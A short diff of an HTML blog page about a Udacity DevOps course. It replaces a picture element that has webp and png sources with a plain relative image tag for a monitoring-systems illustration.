@@ -5742,16 +5616,7 @@ There was a time when every new tester came to me during the onboarding and aske
 <li>growth measurement</li>
 <li>debugging metrics</li>
 </ul>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2016/07/17/course-intro-to-devops-by-udacity/monitoring_systems_hu_3729a9c379662ade.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2016/07/17/course-intro-to-devops-by-udacity/monitoring_systems.png" alt="Monitoring systems" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="monitoring_systems.png" alt="Monitoring systems"></p>
 <h2 id="additional-resources" >
   <a href="#additional-resources">Additional resources</a>
 </h2>
